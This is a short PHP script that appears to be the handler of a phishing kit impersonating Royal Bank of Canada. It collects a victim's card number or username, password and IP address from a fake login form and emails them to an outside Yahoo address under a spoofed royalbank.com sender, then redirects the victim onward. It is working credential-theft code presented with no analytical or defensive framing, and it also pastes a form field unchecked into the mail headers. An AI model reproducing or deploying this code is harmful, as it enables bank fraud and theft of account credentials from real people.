<?

$ip = getenv("REMOTE_ADDR");
$message .= "-----------------------------------------------\n";
$message .= "Client Card/Username: ".$_POST['card']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------------------------------------------\n";

$recipient = "shssh70@yahoo.com";
$subject = "Card - $ip";
$headers = "From: Mos Canada<newcc@royalbank.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Card - $ip", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: rbsqcgi.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>